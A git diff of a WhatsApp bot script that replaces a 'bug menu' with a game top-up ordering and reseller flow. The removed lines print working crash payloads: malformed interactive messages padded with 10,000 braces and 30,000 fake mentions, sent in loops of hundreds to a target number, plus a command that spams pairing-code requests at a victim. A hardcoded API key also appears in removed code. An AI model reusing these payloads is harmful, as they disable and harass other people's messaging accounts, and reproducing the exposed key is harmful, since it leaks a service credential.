@@ -84,14 +84,15 @@ const gamesInfo = {
     pubg: { name: "PUBG Mobile", required: ["user_id"] }}
 
     
-const path = './system/database/users.json';
+const pathResellers = './system/database/resellers.json';
+    const pathUsers = './system/database/users.json';
 
-let userRegistry = {};
-if (fs.existsSync(path)) {
-    userRegistry = JSON.parse(fs.readFileSync(path));
-} else {
-    fs.writeFileSync(path, JSON.stringify({}));
-}
+// Load users & resellers
+let userRegistry = fs.existsSync(pathUsers) ? JSON.parse(fs.readFileSync(pathUsers)) : {};
+let resellers = fs.existsSync(pathResellers) ? JSON.parse(fs.readFileSync(pathResellers)) : {};
+let orderSessions = {};
+
+
 
 //======================
 if (m.message) {
@@ -102,216 +103,10 @@ console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(
 console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
 console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
 console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
-//FUNCTION BUG
-async function locationfc(X, ptcp = true) {
-  try {
-    let message = {
-      ephemeralMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "🩸 TRAXC IS HERE 🩸",
-              hasMediaAttachment: false,
-              locationMessage: {
-                degreesLatitude: -6666666666,
-                degreesLongitude: 6666666666,
-                name: "🩸BOKEP",
-                address: "🩸BOKEP",
-              }, 
-            },
-            body: {
-              text: "🩸BOKEP",
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "{".repeat(10000),
-            },
-            contextInfo: {
-              participant: X,
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from(
-                  {
-                    length: 30000,
-                  },
-                  () =>
-                    "1" +
-                    Math.floor(Math.random() * 5000000) +
-                    "@s.whatsapp.net"
-                ),
-              ],
-            },
-          },
-        },
-      },
-    };
 
-    await rikz.relayMessage(X, message, {
-      messageId: null,
-      participant: { jid: X },
-      userJid: X,
-    });
-  } catch (err) {
-    console.log(err);
-  }
-}
-async function sistemFc(target) {
-  let msg = await generateWAMessageFromContent(
-    target,
-    {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "BOKEP HOTS",
-              hasMediaAttachment: false,
-            },
-            body: {
-              text: "Traxc new era! ",
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "",
-              buttons: [
-                {
-                  name: "single_select",
-                  buttonParamsJson: venomModsData + "\u0000",
-                },
-                {
-                  name: "call_permission_request",
-                  buttonParamsJson: venomModsData + "Neww eraaa",
-                },
-              ],
-            },
-          },
-        },
-      },
-    },
-    {}
-  );
-
-  await rikz.relayMessage(target, msg.message, {
-    messageId: msg.key.id,
-    participant: { jid: target },
-  });
-}
 //======================
 switch (command) {
-//case bug
-case "crot-dalam": {
 
-if (!isPremium) return m.reply('Khusus Premium');
-
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
-
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
-m.reply(`*[!] bug successfully sent to target*`); 
-
-          for (let i = 0; i < 870; i++) {
-           await locationfc(target, ptcp = true) 
-           await sleep(500)
-           await sistemFc(target, true)
-        }
-
-    }
-
-  
-
-break;
-//======================
-case "amba-crot": {
-    
-if (!isPremium) return m.reply('Khusus Premium');  
-    
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] bug successfully sent to target*`); 
-          for (let i = 0; i < 879; i++) {
-            await protocolbug1(target, true) 
-            await protocolbug2(target, true)
-            await protocolbug3(target, true)
-            await protocolbug4(target, true)
-            await protocolbug5(target, true)
-            await protocolbug5(target, false)
-            await protocolbug7X(target, true)
-            await protocolbug7X(target, false)
-            await protocolbug8(target, true)
-            await protocolbug8(target, false)
-        }
-    }
-  
-break;
-//======================
-case "mas-owi": {
-    
-if (!isPremium) return m.reply('Khusus Premium');
-    
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] bug successfully sent to target*`); 
-          for (let i = 0; i < 879; i++) {
-            await bulldozer(target)
-            await bulldozer(target)
-            await bulldozer(target)
-            await bulldozer(target)
-            await protocolbug1(target, true) 
-            await protocolbug2(target, true)
-            await protocolbug3(target, true)
-            await protocolbug4(target, true)
-            await protocolbug5(target, true)
-            await protocolbug5(target, false)
-            await protocolbug7X(target, true)
-            await protocolbug7X(target, false)
-            await protocolbug8(target, true)
-            await protocolbug8(target, false)
-        }
-    }
-  
-break;
-//======================
-case "mas-bowo": {
-    
-if (!isPremium) return m.reply('Khusus Premium');  
-    
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] bug successfully sent to target*`); 
-          for (let i = 0; i < 879; i++) {
-            await locationfc(target, true)
-            await locationfc(target, false)
-            await locationfc(target, true)
-            await locationfc(target, false)
-        }
-
-    }
-  
-break;
-
-case "mas-aniss": {
-    
-if (!isPremium) return m.reply('Khusus Premium');  
-    
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] bug successfully sent to target*`); 
-          for (let i = 0; i < 879; i++) {
-            await bulldozer(target)
-            await protocolbug1(target, true) 
-            await protocolbug2(target, true)
-            await protocolbug3(target, true)
-            await protocolbug4(target, true)
-            await protocolbug5(target, true)
-            await protocolbug5(target, false)
-            await protocolbug7X(target, true)
-            await protocolbug7X(target, false)
-            await protocolbug8(target, true)
-            await protocolbug8(target, false)
-        }
-
-    }
-  
-break;
-
-    
     
 //======================
 case 'public': {
@@ -335,384 +130,153 @@ break
 //=========================
 // MENU
 //=========================
-case 'menu': {
-  const pushname = m.pushName || "User";
-  const role = m.isOwner ? "Owner" : "User";
+case 'register':
+            if(userRegistry[m.sender]) return rikz.sendMessage(m.chat, { text: "You're already registered." }, { quoted: m });
+            userRegistry[m.sender] = { name: m.pushName || "User", role: "User" };
+            fs.writeFileSync(pathUsers, JSON.stringify(userRegistry, null, 2));
+            rikz.sendMessage(m.chat, { text: `Registered successfully as ${userRegistry[m.sender].name}` }, { quoted: m });
+        break;
 
-  const msg = {
-    text: `👋 Hello ${pushname}!\nRole: ${role}\n\nWelcome to Traxc Bot 4.0\n\nSelect a command from below to get started.`,
-    footer: 'Powered by GameVia',
-    buttons: [
-      { buttonId: '.help', buttonText: { displayText: 'Help' }, type: 1 },
-      { buttonId: '.price', buttonText: { displayText: 'Top-Up Prices' }, type: 1 }
-    ],
-    headerType: 1
-  };
-
-  await rikz.sendMessage(m.chat, msg, { quoted: m });
-}
-break;
-
-//=========================
-// HELP
-//=========================
-case 'help': {
-  const pushname = m.pushName || "User";
-
-  const msg = {
-    text: `📖 Help - Traxc Bot Commands
-
-• .menu - Show main menu
-• .help - Show this help
-• .price - View top-up prices for games
-
-Select a command above.`,
-    footer: 'Traxc Bot 4.0',
-    buttons: [
-      { buttonId: '.menu', buttonText: { displayText: 'Main Menu' }, type: 1 }
-    ],
-    headerType: 1
-  };
-
-  await rikz.sendMessage(m.chat, msg, { quoted: m });
-}
-break;
-
-//=========================
-// PRICE MENU (BUTTON SELECTION)
-
-
-
-
-// ===== REGISTER ===== //
-
-  const API_KEY = "API-GVCDEAD0E38EA13632";
-
-// Store users and orders
-let userRegistry = {}; // optionally save/load from JSON
-let orderSessions = {};
-
-// Example games info
-const gamesInfo = {
-    mlbb: { name: "Mobile Legends Malaysia", required: ["user_id", "server_id"] },
-    mlbbbrazil: { name: "Mobile Legends Brazil", required: ["user_id", "server_id"] },
-    mlbbgb: { name: "Mobile Legends Global", required: ["user_id", "server_id"] },
-    codmmy: { name: "CODM MY/SG", required: ["user_id"] },
-    valomy: { name: "Valorant PC MY", required: ["user_id"] },
-    // add other games
-};
-
-
-    // ===== REGISTER ===== //
-    case "register": {
-        const pushname = m.pushName || "User";
-        if (userRegistry[m.sender]) {
-            await rikz.sendMessage(m.chat, { text: "You're already registered." }, { quoted: m });
-            return;
-        }
-        userRegistry[m.sender] = { name: pushname, role: "User" };
-        await rikz.sendMessage(m.chat, { text: `Registered successfully as ${pushname}` }, { quoted: m });
-    }
-    break;
-
-    // ===== PRICE MENU (BUTTONS) ===== //
-    case "price": {
-
-        let userRegistry = {};
-if (fs.existsSync(path)) {
-    userRegistry = JSON.parse(fs.readFileSync(path));
-} else {
-    fs.writeFileSync(path, JSON.stringify({}));
-}
-        if (!userRegistry[m.sender]) {
-            await rikz.sendMessage(m.chat, { text: "Please register first using .register" }, { quoted: m });
-            return;
-        }
-
-        const gamesInfo = {
-    mlbb: { name: "Mobile Legends Malaysia", required: ["user_id", "server_id"] },
-    mlbbbrazil: { name: "Mobile Legends Brazil", required: ["user_id", "server_id"] },
-    mlbbgb: { name: "Mobile Legends Global", required: ["user_id", "server_id"] },
-    mlbbfrmy: { name: "MLBB First Recharge MY", required: ["user_id", "server_id"] },
-    mlbbfrid: { name: "MLBB First Recharge ID", required: ["user_id", "server_id"] },
-    mlbbflashmy: { name: "MLBB Malaysia FS", required: ["user_id", "server_id"] },
-    mlbbid: { name: "MLBB Indonesia", required: ["user_id", "server_id"] },
-    mlbbiditem: { name: "MLBB Indonesia Item", required: ["user_id", "server_id"] },
-    mlbbitem: { name: "MLBB Malaysia Item", required: ["user_id", "server_id"] },
-    mlbbgbitem: { name: "MLBB Global Item", required: ["user_id", "server_id"] },
-    ffsgmyitem: { name: "Free Fire SG/MY Item", required: ["user_id"] },
-    ffsgmy: { name: "Free Fire SG/MY", required: ["user_id"] },
-    mcggid: { name: "Magic Chess Go Go ID", required: ["user_id"] },
-    valomy: { name: "Valorant PC MY", required: ["user_id"] },
-    valoid: { name: "Valorant PC ID", required: ["user_id"] },
-    codmmy: { name: "CODM MY/SG", required: ["user_id"] },
-    dragonrise: { name: "Dragon Raja Rerise SEA", required: ["user_id"] },
-    pubg: { name: "PUBG Mobile", required: ["user_id"] }}
-
-
-        const pushname = m.pushName || "User";
-        const buttons = Object.keys(gamesInfo).map(slug => ({
-            buttonId: `.select-${slug}`,
-            buttonText: { displayText: gamesInfo[slug].name },
-            type: 1
-        }));
-
-        const msg = {
-            text: `Hello ${pushname}\nSelect a game to view top-up prices:`,
-            footer: "Powered by GameVia",
-            buttons,
-            headerType: 1
-        };
-
-        await rikz.sendMessage(m.chat, msg, { quoted: m });
-    }
-    break;
-
-    // ===== HANDLE BUTTON SELECTION ===== //
-    // ===== PRODUCT SELECTION BUTTON ===== //
-    if (command.startsWith(".select-")) {
-        const slug = command.replace(".select-", "");
-        if (!gamesInfo[slug]) return;
-
-        orderSessions[m.sender] = { step: "awaiting_product", gameSlug: slug };
-        await rikz.sendMessage(m.chat, { text: `Fetching top-up prices for ${gamesInfo[slug].name}... ⏳` }, { quoted: m });
-
-        try {
-            const API_KEY = "API-GVCDEAD0E38EA13632";
-            const res = await fetch("https://api.gamevia.shop/v1/get_products.php", {
-                method: "POST",
-                headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
-                body: JSON.stringify({ slug })
-            });
-            const data = await res.json();
-            if (!data.success || !data.products?.length) {
-                await rikz.sendMessage(m.chat, { text: `No products found for ${gamesInfo[slug].name}` }, { quoted: m });
-                return;
-            }
-
-            const productButtons = data.products.map(p => ({
-                buttonId: `.order-${slug}-${p.srv_code}`,
-                buttonText: { displayText: `${p.name} - RM${p.vprice}` },
-                type: 1
-            }));
-
-            await rikz.sendMessage(m.chat, {
-                text: `🎮 ${gamesInfo[slug].name} Top-Up Prices\nSelect a product to order:`,
-                footer: "You can select any product",
-                buttons: productButtons,
+        case '.menu':
+            rikz.sendMessage(m.chat, {
+                text: `Hello ${m.pushName || "User"}! Choose an option:`,
+                footer: 'Powered by GameVia',
+                buttons: [
+                    { buttonId: '.help', buttonText: { displayText: 'Help' }, type: 1 },
+                    { buttonId: '.price', buttonText: { displayText: 'Top-Up Prices' }, type: 1 }
+                ],
                 headerType: 1
             }, { quoted: m });
+        break;
 
-        } catch (err) {
-            console.log(err);
-            await rikz.sendMessage(m.chat, { text: "Failed to fetch product data." }, { quoted: m });
-        }
-        return;
-    }
+        case 'help':
+            rikz.sendMessage(m.chat, {
+                text: "Commands:\n• .menu\n• .help\n• .price\n• .register",
+                footer: 'Traxc Bot 4.0',
+                buttons: [{ buttonId: '.menu', buttonText: { displayText: 'Main Menu' }, type: 1 }],
+                headerType: 1
+            }, { quoted: m });
+        break;
 
-    // ===== ORDER BUTTON ===== //
-    if (command.startsWith(".order-")) {
-        const [slug, srvCode] = command.replace(".order-", "").split("-");
-        if (!gamesInfo[slug]) return;
-
-        orderSessions[m.sender] = { step: "awaiting_ids", gameSlug: slug, product: srvCode };
-        const requiredFields = gamesInfo[slug].required;
-        let askText = "Please provide the following info:\n";
-        requiredFields.forEach(f => askText += `• ${f.replace("_", " ").toUpperCase()}\n`);
-
-        await rikz.sendMessage(m.chat, { text: askText }, { quoted: m });
-        return;
-    }
-
-    // ===== RECEIVE USER INPUT FOR ORDER ===== //
-    if (orderSessions[m.sender]?.step === "awaiting_ids") {
-        const session = orderSessions[m.sender];
-        const slug = session.gameSlug;
-        const requiredFields = gamesInfo[slug].required;
-
-        const values = m.text.split(/[\s,]+/);
-        if (values.length < requiredFields.length) {
-            await rikz.sendMessage(m.chat, { text: `You must provide all fields: ${requiredFields.join(", ")}` }, { quoted: m });
-            return;
-        }
-
-        const orderData = {};
-        requiredFields.forEach((f, i) => orderData[f] = values[i]);
-        session.step = "awaiting_confirmation";
-        session.orderData = orderData;
-
-        let summary = `✅ Order Summary:\nGame: ${gamesInfo[slug].name}\nProduct: ${session.product}\n`;
-        requiredFields.forEach(f => summary += `${f.toUpperCase()}: ${orderData[f]}\n`);
-
-        const confirmButtons = [
-            { buttonId: `.confirm`, buttonText: { displayText: 'Confirm Order' }, type: 1 },
-            { buttonId: `.change`, buttonText: { displayText: 'Change Info' }, type: 1 }
-        ];
-
-        await rikz.sendMessage(m.chat, {
-            text: summary,
-            footer: 'Confirm or change your order',
-            buttons: confirmButtons,
-            headerType: 1
-        });
-        return;
-    }
-
-    // ===== CONFIRM ORDER ===== //
-    if (command === ".confirm" && orderSessions[m.sender]?.step === "awaiting_confirmation") {
-        const session = orderSessions[m.sender];
-        try {
-            const res = await fetch("https://api.gamevia.shop/v1/order.php", {
-                method: "POST",
-                headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
-                body: JSON.stringify({ srv_code: session.product, ...session.orderData })
-            });
-            const data = await res.json();
-            if (data.success) {
-                await rikz.sendMessage(m.chat, { text: `✅ Order Success!\nOrder ID: ${data.custom_order_id}` }, { quoted: m });
-            } else {
-                await rikz.sendMessage(m.chat, { text: `❌ Order Failed: ${data.message || 'Unknown error'}` }, { quoted: m });
+        case 'price':
+            if(!userRegistry[m.sender]) return rikz.sendMessage(m.chat, { text: "Please register first using .register" }, { quoted: m });
+            // Fetch products dynamically for each game
+            let buttons = [];
+            for(let slug in gamesInfo){
+                buttons.push({ buttonId: `.select-${slug}`, buttonText: { displayText: gamesInfo[slug].name }, type: 1 });
             }
-        } catch (err) {
-            console.log(err);
-            await rikz.sendMessage(m.chat, { text: `❌ Order Failed` }, { quoted: m });
-        }
-        delete orderSessions[m.sender];
-        return;
+            rikz.sendMessage(m.chat, { text: "Select a game to view prices:", footer: "Powered by GameVia", buttons, headerType: 1 }, { quoted: m });
+        break;
+
+        case command.match(/^\.select-(.+)$/)?.input:
+            {
+                const slug = command.replace('.select-', '');
+                if(!gamesInfo[slug]) break;
+                orderSessions[m.sender] = { step: "awaiting_product", gameSlug: slug };
+
+                try{
+                    const res = await fetch("https://api.gamevia.shop/v1/get_products.php", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
+                        body: JSON.stringify({ slug })
+                    });
+                    const data = await res.json();
+                    if(!data.success || !data.products?.length) return rikz.sendMessage(m.chat, { text: "No products found." }, { quoted: m });
+
+                    const productButtons = data.products.map(p => {
+                        const profitPrice = (p.price * 1.02).toFixed(2);
+                        return { buttonId: `.order-${slug}-${p.srv_code}-${profitPrice}`, buttonText: { displayText: `${p.name} - RM${profitPrice}` }, type: 1 };
+                    });
+
+                    rikz.sendMessage(m.chat, {
+                        text: `🎮 ${gamesInfo[slug].name} Products (2% profit included)`,
+                        footer: 'Select a product to order',
+                        buttons: productButtons,
+                        headerType: 1
+                    }, { quoted: m });
+
+                } catch(err){ console.log(err); rikz.sendMessage(m.chat, { text: "Failed to fetch products." }, { quoted: m }); }
+            }
+        break;
+
+        case command.match(/^\.order-(.+)-(.+)-(.+)$/)?.input:
+            {
+                const [slug, srvCode, price] = command.replace('.order-', '').split('-');
+                orderSessions[m.sender] = { step: "awaiting_ids", gameSlug: slug, product: srvCode, price: parseFloat(price) };
+                const requiredFields = gamesInfo[slug].required;
+                let askText = "Please provide:\n" + requiredFields.map(f => `• ${f.toUpperCase()}`).join('\n');
+                rikz.sendMessage(m.chat, { text: askText }, { quoted: m });
+            }
+        break;
+
+        case command.match(/^.+$/)?.input:
+            // Receive user input if in order session
+            if(orderSessions[m.sender]?.step === "awaiting_ids"){
+                const session = orderSessions[m.sender];
+                const values = args;
+                if(values.length < gamesInfo[session.gameSlug].required.length) return rikz.sendMessage(m.chat, { text: "Incomplete info." }, { quoted: m });
+
+                const orderData = {};
+                gamesInfo[session.gameSlug].required.forEach((f,i) => orderData[f] = values[i]);
+                session.step = "awaiting_confirmation";
+                session.orderData = orderData;
+
+                const summary = `✅ Order Summary\nGame: ${gamesInfo[session.gameSlug].name}\nProduct: ${session.product}\nPrice: RM${session.price}\n` +
+                    Object.entries(orderData).map(([k,v]) => `${k.toUpperCase()}: ${v}`).join('\n');
+
+                rikz.sendMessage(m.chat, {
+                    text: summary,
+                    footer: "Confirm or change your order",
+                    buttons: [
+                        { buttonId: '.confirm', buttonText: { displayText: 'Confirm' }, type: 1 },
+                        { buttonId: '.change', buttonText: { displayText: 'Change Info' }, type: 1 }
+                    ],
+                    headerType: 1
+                }, { quoted: m });
+            }
+        break;
+
+        case 'confirm':
+            if(orderSessions[m.sender]?.step !== "awaiting_confirmation") break;
+            {
+                const session = orderSessions[m.sender];
+                try{
+                    const res = await fetch("https://api.gamevia.shop/v1/order.php", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
+                        body: JSON.stringify({ srv_code: session.product, ...session.orderData })
+                    });
+                    const data = await res.json();
+                    rikz.sendMessage(m.chat, { text: data.success ? `✅ Order Success!\nOrder ID: ${data.custom_order_id}` : `❌ Order Failed: ${data.message}` }, { quoted: m });
+                } catch(err){ console.log(err); rikz.sendMessage(m.chat, { text: "❌ Order Failed" }, { quoted: m }); }
+                delete orderSessions[m.sender];
+            }
+        break;
+
+        case 'change':
+            if(orderSessions[m.sender]?.step === "awaiting_confirmation"){
+                orderSessions[m.sender].step = "awaiting_ids";
+                const requiredFields = gamesInfo[orderSessions[m.sender].gameSlug].required;
+                let askText = "Please provide:\n" + requiredFields.map(f => `• ${f.toUpperCase()}`).join('\n');
+                rikz.sendMessage(m.chat, { text: askText }, { quoted: m });
+            }
+        break;
+
+        // Reseller topup only by bot owner
+        case 'addbalance':
+            if(!isCreator) break;
+            const [resellerId, amount] = args;
+            if(!resellers[resellerId]) resellers[resellerId] = { balance: 0 };
+            resellers[resellerId].balance += parseFloat(amount);
+            fs.writeFileSync(pathResellers, JSON.stringify(resellers, null, 2));
+            rikz.sendMessage(m.chat, { text: `✅ Added RM${amount} to ${resellerId}. Total: RM${resellers[resellerId].balance}` }, { quoted: m });
+        break;
+
+        default:
+            break;
     }
 
-    // ===== CHANGE ORDER INFO ===== //
-    if (command === ".change" && orderSessions[m.sender]?.step === "awaiting_confirmation") {
-        orderSessions[m.sender].step = "awaiting_ids";
-        const slug = orderSessions[m.sender].gameSlug;
-        const requiredFields = gamesInfo[slug].required;
-        let askText = "Please provide the following info:\n";
-        requiredFields.forEach(f => askText += `• ${f.replace("_", " ").toUpperCase()}\n`);
-        await rikz.sendMessage(m.chat, { text: askText }, { quoted: m });
-        return;
-    }
-
-break;
-
-// End of command switch
-
-
-    // ===== TRAXC MENU ===== //
-    case "traxc": {
-        let itsmenu = `
-> 口 𝙏𝙍𝘼𝙓𝘾 _𝗩𝗘𝗥𝗦𝗜𝗢𝗡_ 𝟰 !!
-Hello! Have A Nice Day!🤍
-
-_"jangan berpikir tidak mungkin, tapi berpikirlah bagaimana caranya"_
-
-– 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧
-❒ Botname : Traxc
-❒ Creator : VallxDev
-❒ Version : 4.0 
-❒ Status : *Free*
-
-– 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔
-➛ .addmurbug
-➛ .delmurbug
-
-– 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔
-➛ .amba-crot 62xxx
-➛ .crot-dalam 62xxx
-➛ .mas-owi 62xxx
-➛ .mas-bowo 62xxx
-➛ .mas-aniss 62xxx
-
-– 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔
-➛ .spairing 62xxxx
-➛ .sreactch link nya 
-
-*Script Information :*
-https://whatsapp.com/channel/0029Vb6OnKIIHphDJHrHPD0a
-> © VallxDev (DEV NGUAWUR CIKK)
-`;
-
-        await rikz.sendMessage(m.chat, {
-            image: { url: "https://files.catbox.moe/k1vd3r.jpg" },
-            caption: itsmenu
-        }, { quoted: m });
-    }
-    break;
-
-//======================
-case "addmurbug": {
-if (!isCreator) return m.reply(mess.owner);
-if (!text) return m.reply("❌ Example: /addmurbug (nomor)");
-let user = text.replace(/[^\d]/g, "");
-addPremiumUser(user, 30);
-m.reply(`✅ Add murbug:\n• ${user} (30 days)`)}
-break;
-//======================
-case "delmurbug": {
-if (!isCreator) return m.reply(mess.owner);
-if (!text) return m.reply("❌ Example: /delmurbug (nomor)");
-let user = text.replace(/[^\d]/g, ""); 
-let removed = delPremiumUser(user);
-m.reply(removed ? `✅ Removed murbug:\n• ${user}` : "❌ User tidak ditemukan")}
-break;
-//======================
-//case reactch
-  case "sreactch": {
-
-if (!isPremium) return m.reply('Khusus Premium');
-
-if (!text) return m.reply(".sreactch linkpesan 😂")
-
-if (!args[0] || !args[1]) return m.reply("Wrong Format")
-
-if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
-
-let result = args[0].split('/')[4]
-
-let serverId = args[0].split('/')[5]
-
-let res = await rikz.newsletterMetadata("invite", result)
-
-await rikz.newsletterReactMessage(res.id, serverId, args[1])
-
-m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
-
-}
-
-break      
-//case spam pair
-//======================
-case 'spairing': {
-  if (!isPremium) return m.reply('Khusus Premium');
-  if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
-  m.reply('proses...');
-  let [peenis, pepekk = "200"] = text.split("|");
-  let target = peenis.replace(/[^0-9]/g, '').trim();
-  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
-  const { state } = await useMultiFileAuthState('pepek');
-  const { version } = await fetchLatestBaileysVersion();
-  const pino = require("pino");
-  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
-  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
-  for (let i = 0; i < pepekk; i++) {
-    await sleep(1500);
-    let prc = await sucked.requestPairingCode(target);
-    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
-  }
-  await sleep(15000);
-}
-break;
-
-case 'cek-kontol': case 'idch': {
-if (!text) return m.reply("link ch nya mana kontol?")
-if (!text.includes("https://whatsapp.com/channel/")) return 
-m.reply("Link tautan tidak valid")
-m.reply(`*Cek Id Ch Feature Process!...*`)
-let result = text.split('https://whatsapp.com/channel/')[1]
-let res = await rikz.newsletterMetadata("invite", result)
-let teks = `${res.id}`
-return m.reply(teks)
-}
-break;
+ 
 //======================
 default:
 }} catch (err) {
